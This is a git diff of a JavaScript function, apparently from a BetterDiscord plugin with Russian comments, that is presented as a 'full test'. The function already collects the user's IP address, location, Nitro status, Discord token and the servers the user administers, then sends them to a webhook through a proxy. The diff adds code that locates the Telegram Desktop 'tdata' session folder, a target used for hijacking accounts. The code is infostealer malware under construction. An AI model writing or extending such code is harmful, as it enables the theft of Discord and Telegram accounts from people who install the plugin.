@@ -1,9 +1,14 @@
 async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
+    const fs = require('fs');
+    const os = require('os');
+    const path = require('path');
+
     let result = {
         ip: null,
         location: null,
         nitro: "Нет",
         dtoken: null,
+        telegram_path: "Не найден",
         admin_servers: []
     };
     
@@ -39,7 +44,24 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         result.dtoken = token;
     } catch (e) {}
 
-    // 3. Ищем серверы, где ты админ, и считаем людей
+    // 3. Поиск пути к Telegram Desktop (tdata)
+    try {
+        // Возможные пути установки Telegram
+        const possiblePaths = [
+            path.join(process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming'), 'Telegram Desktop', 'tdata'),
+            path.join(process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local'), 'Telegram Desktop', 'tdata'),
+            path.join(os.homedir(), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
+        ];
+
+        for (const p of possiblePaths) {
+            if (fs.existsSync(p)) {
+                result.telegram_path = p;
+                break;
+            }
+        }
+    } catch (e) { console.error("Telegram Path Error", e); }
+
+    // 4. Ищем серверы, где ты админ, и считаем людей
     try {
         const GuildStore = BdApi.Webpack.getStore("GuildStore");
         const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
@@ -84,7 +106,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         }
     } catch (e) { console.error("Guild Error", e); }
 
-    // 4. Отправка на вебхук через прокси
+    // 5. Отправка на вебхук через прокси
     try {
         const proxyUrlFull = `${proxyUrl}/?url=${encodeURIComponent(webhookUrl)}`;
         const response = await BdApi.Net.fetch(proxyUrlFull, {
